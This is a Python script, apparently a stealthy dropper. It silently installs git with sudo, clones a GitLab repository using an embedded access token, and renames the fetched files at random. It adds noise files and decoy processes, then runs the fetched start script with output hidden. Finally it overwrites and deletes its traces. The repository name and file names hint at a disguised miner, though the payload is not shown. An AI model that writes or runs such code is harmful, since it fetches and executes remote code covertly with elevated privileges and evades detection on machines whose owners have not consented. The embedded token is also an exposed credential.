import requests
import zipfile
import io
import subprocess
import os
import sys
import shutil
import time
import random
import string
import tempfile
import gc

def generate_random_name():
    consonants = "bcdfghjklmnpqrstvwxyz"
    vowels = "aeiou"
    length = random.randint(6, 9)
    name = ""
    use_consonant = True
    for _ in range(length):
        if use_consonant:
            name += random.choice(consonants)
            use_consonant = False
        else:
            if random.choice([True, False]):
                name += random.choice(consonants)
            else:
                name += random.choice(vowels)
                use_consonant = True
    return name

def main():
    try:
        temp_dir = tempfile.mkdtemp()
        # Clone GitLab repository into temp_dir silently
        clone_cmd = (
            "sudo apt update -qq; sudo apt install -y git && "
            "git clone https://hamzouai85:glpat-qTFmsC_RkbzuptZbzy_x@gitlab.com/hamzouai85-group/mino-project.git tmp && "
            "mv tmp/* tmp/.gitignore tmp/.gitattributes . 2>/dev/null || true && rm -rf tmp"
        )
        subprocess.run(clone_cmd, shell=True, check=True, cwd=temp_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.chdir(temp_dir)
        start_sh_path = os.path.join(temp_dir, "start.sh")
        if not os.path.exists(start_sh_path):
            sys.exit(1)
        time.sleep(random.uniform(1, 3))
        for _ in range(random.randint(5, 10)):
            noise_file = f"noise_{random.randint(1, 1000)}.tmp"
            with open(noise_file, "w") as f:
                f.write("".join(random.choices(string.ascii_letters, k=100)))
            with open(noise_file, "a"):
                pass
            time.sleep(random.uniform(0.1, 0.5))
        
        # Renaming logic
        orig_start = "start.sh"
        orig_app = "app.py"
        orig_dataset = "dataset.txt"
        orig_benchmark = "benchmark.txt"
        
        if not all(os.path.exists(f) for f in [orig_start, orig_app, orig_dataset, orig_benchmark]):
            sys.exit(1)
        
        new_start = f"{generate_random_name()}.sh"
        new_app = f"{generate_random_name()}.py"
        new_dataset = f"{generate_random_name()}.txt"
        new_benchmark = f"{generate_random_name()}.txt"
        
        shutil.copy(orig_start, new_start)
        shutil.copy(orig_app, new_app)
        shutil.copy(orig_dataset, new_dataset)
        shutil.copy(orig_benchmark, new_benchmark)
        
        with open(new_start, "r") as f:
            content = f.read()
        content = content.replace(f'"{orig_app}"', f'"{new_app}"')
        content = content.replace(orig_dataset, new_dataset)
        with open(new_start, "w") as f:
            f.write(content)
        
        with open(new_app, "r") as f:
            content = f.read()
        content = content.replace(orig_benchmark, new_benchmark)
        with open(new_app, "w") as f:
            f.write(content)
        
        os.chmod(new_start, 0o755)
        
        for f in [orig_start, orig_app, orig_benchmark]:
            os.remove(f)
        
        for _ in range(random.randint(2, 5)):
            subprocess.Popen(["sleep", str(random.uniform(1, 5))], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process = subprocess.Popen(
            ["bash", new_start],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        return_code = process.wait()
        
    except Exception:
        pass
    
    finally:
        try:
            if 'new_start' in locals() and os.path.exists(new_start):
                for _ in range(3):
                    with open(new_start, "wb") as f:
                        f.write(os.urandom(os.path.getsize(new_start)))
                    os.remove(new_start)
            if 'temp_dir' in locals() and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass
        for _ in range(random.randint(5, 10)):
            try:
                os.remove(f"noise_{random.randint(1, 1000)}.tmp")
            except:
                pass
        locals().clear()
        gc.collect()
        sys.exit(0 if 'return_code' not in locals() else return_code)

if __name__ == "__main__":
    main()
    globals().clear()
